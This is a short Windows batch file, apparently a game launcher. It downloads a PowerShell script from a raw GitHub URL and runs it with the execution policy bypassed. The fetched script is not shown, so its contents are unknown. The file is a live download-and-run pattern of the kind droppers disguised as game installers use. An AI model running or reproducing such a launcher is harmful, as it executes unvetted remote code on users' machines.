@echo off
setlocal
cd /d "%~dp0"
if not exist "%~dp0Download_Game.ps1" (
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/aarongameboy/package/main/Download_Game.ps1' -OutFile 'Download_Game.ps1'"
    if errorlevel 1 goto failed
)
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%~dp0Download_Game.ps1" -StartGame
if errorlevel 1 goto failed
exit /b 0
:failed
echo Download or verification failed. Check your network and run again.
pause
exit /b 1
